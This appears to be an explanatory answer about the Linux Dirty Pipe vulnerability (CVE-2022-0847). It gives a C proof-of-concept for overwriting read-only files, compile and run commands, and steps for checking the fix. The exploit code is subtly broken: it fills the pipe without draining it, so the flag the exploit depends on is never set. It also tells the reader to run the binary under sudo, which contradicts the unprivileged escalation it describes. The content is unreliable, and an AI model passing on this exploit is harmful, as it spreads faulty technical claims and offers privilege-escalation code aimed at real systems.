The Dirty Pipe vulnerability (CVE-2022-0847) affects the Linux kernel versions 5.8 and later. It allows an unprivileged user to overwrite data in arbitrary read-only files, leading to privilege escalation. This vulnerability arises from a flaw in how the Linux kernel's pipe implementation handles buffer management, which can lead to a situation where data can be written into pages that are later mapped into a file.

Below is a simplified proof-of-concept (PoC) code written in C to demonstrate the exploitation of CVE-2022-0847:

```c
// dirty_pipe.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
    // Arguments check
    if (argc < 3) {
        printf("Usage: %s <file_to_overwrite> <data_to_write>\n", argv[0]);
        return 1;
    }

    const char *file_path = argv[1];
    const char *data = argv[2];
    size_t data_len = strlen(data);

    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) {
        perror("pipe");
        return 1;
    }

    // Fill the pipe to make all buffers busy
    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));
    for (int i = 0; i < 16; i++) {
        if (write(pipe_fd[1], buffer, sizeof(buffer)) != sizeof(buffer)) {
            perror("write");
            close(pipe_fd[0]);
            close(pipe_fd[1]);
            return 1;
        }
    }

    // Open the target file
    int file_fd = open(file_path, O_RDONLY);
    if (file_fd == -1) {
        perror("open");
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return 1;
    }

    // Trigger the vulnerability
    if (splice(file_fd, NULL, pipe_fd[1], NULL, 1, 0) == -1) {
        perror("splice");
        close(file_fd);
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return 1;
    }

    // Write the arbitrary data
    if (write(pipe_fd[1], data, data_len) != data_len) {
        perror("write");
        close(file_fd);
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return 1;
    }

    close(file_fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);

    printf("Successfully wrote to %s\n", file_path);
    return 0;
}
```

To compile this code with gcc, you can use the following command:

```sh
gcc dirty_pipe.c -o dirty_pipe
```

To execute the compiled binary with root privileges, you can use the `sudo` command:

```sh
sudo ./dirty_pipe /path/to/readonly/file "data to overwrite"
```

Please note that this code is a basic PoC and does not include payload structure details for privilege escalation scenarios. It is meant to demonstrate the manipulation of pipe buffers to overwrite read-only files.

Mitigation Validation Steps:

1. Update the Linux kernel to a version that includes the patch for CVE-2022-0847. The vulnerability has been fixed in kernel versions 5.16.11, 5.15.25, and 5.10.102.

2. After updating, reboot your system to ensure the new kernel is in use.

3. Verify your kernel version by running `uname -r` and confirming it is a patched version.

4. To ensure the mitigation is effective, re-run the proof-of-concept code. It should fail to overwrite the read-only file.

5. Regularly check for and apply security updates to your Linux systems.

Always test mitigation steps in a controlled environment before deploying to production systems.

